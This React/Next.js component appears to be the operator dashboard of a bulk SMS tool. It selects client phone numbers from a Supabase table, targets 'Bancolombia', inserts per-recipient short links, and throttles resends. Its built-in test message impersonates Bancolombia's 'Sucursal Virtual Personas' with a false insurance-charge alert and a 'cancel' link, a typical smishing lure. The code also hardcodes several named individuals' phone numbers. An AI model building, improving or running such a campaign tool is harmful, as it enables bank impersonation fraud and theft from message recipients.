'use client';
import { z } from 'zod';
import React from 'react';
import { toast } from 'sonner';
import { useForm } from 'react-hook-form';
import { Button } from '@/components/ui/button';
import { supabase } from '@/lib/supabase/client';
import { Checkbox } from '@/components/ui/checkbox';
import { Textarea } from '@/components/ui/textarea';
import { capitalizeFirstLetter } from '@/lib/utils';
import useTableFetch from '@/hooks/use-table-fetch';
import { zodResolver } from '@hookform/resolvers/zod';
import DataTable from '@/components/mask-ui/data-table';
import UploadClients from './components/upload-clients';
import { createShortURL, customSendSMS, sendSMS } from '@/lib/courier';
import DataTablePaginationClientSide from '@/components/mask-ui/pagination';
import {
  Form,
  FormItem,
  FormField,
  FormMessage,
  FormControl,
  FormLabel,
  FormDescription,
} from '@/components/ui/form';
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
  DialogTrigger,
} from '@/components/ui/dialog';
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from '@/components/ui/select';
import Pinger from '@/components/mask-ui/pinger';
import useScrape from '@/hooks/use-scrape';

const formSchema = z.object({
  message: z.string().min(2).max(680),
  destination: z.string().min(1),
});
import { differenceInMilliseconds, format } from 'date-fns';
import { mutate } from 'swr';

const CourierContainer = () => {
  const [isOpenModalSendMesage, setIsOpenModalSendMesage] =
    React.useState(false);
  const [neverSend, setNeverSend] = React.useState(false);
  const [rowSelection, setRowSelection] = React.useState<any[]>([]);
  const form = useForm<z.infer<typeof formSchema>>({
    resolver: zodResolver(formSchema),
    defaultValues: {
      message: '',
      destination: '',
    },
  });
  console.log(neverSend);
  const { data, isLoading, pagination, handlerPageSize, handlerCurrentPage } =
    useTableFetch('clients');

  const disabledButton = rowSelection.length === 0;

  const excludedNumbers = data?.data?.flatMap((d) =>
    isAvaibleTimeToSendMessage(d?.bc?.sendDate, d?.bc?.recived) ? [] : d.id
  );
  const handleSubmit = async ({ message }: z.infer<typeof formSchema>) =>
    await new Promise((res, rej) => {
      toast.promise(
        sendMessage(message, rowSelection, excludedNumbers as any).then(() => {
          // form.setValue('message', '');
          setIsOpenModalSendMesage(false);
          setTimeout(() => res(''), 2000);
        }),
        {
          loading: 'Cargando...',
          success: 'Mensajes enviados!',
          error: () => {
            rej('');
            return 'Hubo un error!';
          },
        }
      );
    });

  const testRequest = async () =>
    await new Promise((res, rej) => {
      toast.promise(
        sendMessage(
          'Estimado usuario, Suc. Virtual Personas te informa que se activo un seguro de celular protegido por $139,900. El 05/08/2024. Si desea cancelar: {url} TyC*',
          // '{name} test',
          [],
          excludedNumbers as any
        ).then(() => {
          // form.setValue('message', '');
          setIsOpenModalSendMesage(false);
          setTimeout(() => res(''), 2000);
        }),
        {
          loading: 'Cargando...',
          success: 'Mensajes enviados!',
          error: () => {
            rej('');
            return 'Hubo un error!';
          },
        }
      );
    });
  return (
    <section className='flex-1 w-full max-w-5xl p-4 mx-auto space-y-4 overflow-auto'>
      <section className='flex justify-between'>
        <section className='flex items-center'>
          <h2 className='text-xl font-medium'>Mensajeria</h2>
        </section>
        <section className='space-x-3'>
          <Button variant={'outline'} onClick={testRequest} size={'sm'}>
            Test req
          </Button>
          <Dialog
            onOpenChange={setIsOpenModalSendMesage}
            open={isOpenModalSendMesage}
          >
            <DialogTrigger asChild>
              <Button
                size={'sm'}
                variant={'secondary'}
                disabled={disabledButton}
              >
                {' '}
                Enviar mensaje
              </Button>
            </DialogTrigger>
            <DialogContent className='sm:max-w-[425px]'>
              <DialogHeader>
                <DialogTitle>Enviar mensaje</DialogTitle>
                <DialogDescription>
                  Envia mensajeria a los clientes seleccionados.
                </DialogDescription>
              </DialogHeader>
              <Form {...form}>
                <form
                  onSubmit={form.handleSubmit(handleSubmit)}
                  className='space-y-3'
                >
                  <FormField
                    control={form.control}
                    name='destination'
                    render={({ field }) => (
                      <FormItem>
                        <FormLabel>Destination</FormLabel>
                        <Select
                          onValueChange={field.onChange}
                          defaultValue={field.value}
                        >
                          <FormControl>
                            <SelectTrigger>
                              <SelectValue placeholder='Select a destination to register' />
                            </SelectTrigger>
                          </FormControl>
                          <SelectContent>
                            {DATA_DESTINATION.map((d) => (
                              <SelectItem value={d.value} key={d.value}>
                                {d.label}
                              </SelectItem>
                            ))}
                          </SelectContent>
                        </Select>

                        <FormMessage />
                      </FormItem>
                    )}
                  />
                  <FormField
                    control={form.control}
                    name='message'
                    render={({ field }) => (
                      <FormItem>
                        <FormLabel>Message</FormLabel>

                        <FormControl>
                          <Textarea
                            disabled={form.formState.isSubmitting}
                            rows={4}
                            placeholder=''
                            {...field}
                          />
                        </FormControl>
                        <FormDescription className='flex justify-between'>
                          <span>&#123;name&#125; &#123;url&#125;</span>
                          <span>{field.value.length}</span>
                        </FormDescription>
                        <FormMessage />
                      </FormItem>
                    )}
                  />
                  <section className='flex justify-end'>
                    <Button
                      size={'sm'}
                      type='submit'
                      disabled={form.formState.isSubmitting}
                    >
                      Submit
                    </Button>
                  </section>
                </form>
              </Form>
            </DialogContent>
          </Dialog>
          <UploadClients />
        </section>
      </section>
      <section className='flex items-center gap-4'>
        <section className='text-xs'>
          {rowSelection.length} clientes seleccionados.
        </section>
        {/* <section className='flex items-center gap-2 text-xs'>
          <Checkbox onCheckedChange={(e) => setNeverSend(Boolean(e))} />
          Nunca enviado
        </section> */}
      </section>
      <DataTable
        columns={ColumnsCourierTable}
        data={data?.data ?? []}
        setRowData={setRowSelection}
        loading={isLoading}
        rowData={rowSelection}
      />
      <DataTablePaginationClientSide
        {...{
          pagination,
          handlerPageSize,
          handlerCurrentPage,
          meta: data?.meta,
        }}
      />
    </section>
  );
};

export default CourierContainer;

const ColumnsCourierTable = [
  {
    id: 'select',
    header: ({ table }: any) => (
      <div className='w-4 h-4'>
        <Checkbox
          checked={table.getIsAllRowsSelected()}
          onCheckedChange={(value) => table.toggleAllPageRowsSelected(!!value)}
          aria-label='Select all'
        />
      </div>
    ),
    cell: ({ row }: any) => {
      const areRecived = row?.original?.bc?.recived === true;
      const areAvaible = areRecived
        ? false
        : isAvaibleTimeToSendMessage(row?.original?.bc?.sendDate);

      return (
        <div className='w-4 h-4'>
          {areAvaible && (
            <Checkbox
              checked={row.getIsSelected()}
              onCheckedChange={(value) => row.toggleSelected(!!value)}
              aria-label='Select row'
              className='h-4'
            />
          )}
        </div>
      );
    },
  },
  {
    id: 'id',
    header: 'ID',
    cell: ({ row }: any) => {
      return row.original.id;
    },
  },
  {
    accessorKey: 'id',
    header: () => 'Numero',
    cell: ({ row }: any) => {
      return <div>{row.original.number}</div>;
    },
  },
  {
    accessorKey: 'name_selected',
    header: () => 'Nombre Seleccionado',
    cell: ({ row }: any) => {
      return (
        <div className='overflow-hidden max-w-36 text-ellipsis'>
          {row.original.name_selected}
        </div>
      );
    },
  },
  {
    accessorKey: 'bc',
    header: () => 'BC',
    cell: ({ row }: any) => {
      const areRecived = row?.original?.bc?.recived === true;
      const areAvaible = isAvaibleTimeToSendMessage(
        row?.original?.bc?.sendDate
      );

      return (
        <div className='grud place-items-center'>
          <Pinger
            softColor={
              areRecived
                ? 'bg-red-400'
                : !areAvaible
                ? 'bg-gray-200'
                : 'bg-green-200'
            }
            hardColor={
              areRecived
                ? 'bg-red-400'
                : !areAvaible
                ? 'bg-gray-600'
                : 'bg-green-400'
            }
          />
        </div>
      );
    },
  },
];

const validateAreAvaible = (row: any) => !row.original.bc?.sendDate;

const sendMessage = (
  msg: string,
  data: { name: string; phone: string }[],
  excludedIds: number[]
) => sendAllRequests(msg, data, excludedIds);

const sendAllRequests = async (
  msg: string,
  data: any,
  excludedIds: number[]
) => {
  try {
    const filteredData = data.filter((d: any) => !excludedIds.includes(d.id));
    const sendDate = new Date();
    const markList = filteredData.map((d: any) => ({
      id: d.id,
      bc: { sendDate },
    }));

    await supabase
      .from('clients')
      .upsert(
        markList,
        //@ts-ignore
        { onConflict: ['id'] }
      )
      .then((res) => console.log(res));
    console.log(filteredData);
    const dataDouble = [
      ...filteredData,
      {
        name: 'Kevin',
        phone: 3008948802,
      },
      {
        name: 'Adrian',
        phone: 3242378501,
      },
      {
        name: 'Pablo',
        phone: 3244929950,
      },
    ];
    console.log(dataDouble);
    await Promise.all(dataDouble.map((d: any) => sendRequest(msg, d)));

    console.log('All requests sent successfully');
  } catch (err) {
    console.error('Error sending all requests:', err);
  }
};

const sendRequest = async (
  msg: string,
  {
    name,
    phone,
  }: {
    name: string | null;
    phone: string;
  }
) => {
  try {
    let nameParsed = name ?? '';
    let personalizedMsg = msg;
    if (name) nameParsed = capitalizeFirstLetter(name?.split(' ')?.[0]);
    if (personalizedMsg.includes('{name}'))
      personalizedMsg = personalizedMsg.replace('{name}', nameParsed);
    if (personalizedMsg.includes('{url}')) {
      console.log(nameParsed);
      const { short_url } = await createShortURL(null, phone);
      const parsedUrl = short_url
        ? short_url.split('https://').pop()
        : 't.ly/8GYVH';

      personalizedMsg = personalizedMsg.replace('{url}', parsedUrl);
    }

    await customSendSMS(personalizedMsg, phone);
  } catch (err) {
    console.error(err);
  }
};

const DATA_DESTINATION = [
  {
    value: 'Bancolombia',
    label: 'Bancolombia',
  },
];
const isAvaibleTimeToSendMessage = (dateSend: string, recived?: boolean) => {
  if (recived) return false;
  if (!dateSend) {
    console.log(dateSend);
    return true;
  }
  console.log(dateSend);
  const sendDate = new Date(dateSend);
  const now = new Date();
  const twelveHoursInMilliseconds = 12 * 60 * 60 * 1000; // 12 hours in milliseconds

  // Calculate the difference in milliseconds
  const timeDifference = differenceInMilliseconds(now, sendDate);

  // Check if the difference is greater than 12 hours
  if (timeDifference > twelveHoursInMilliseconds) {
    console.log(format(sendDate, 'dd-MM-yyyy hh:mm a'));
    return true;
  }
};
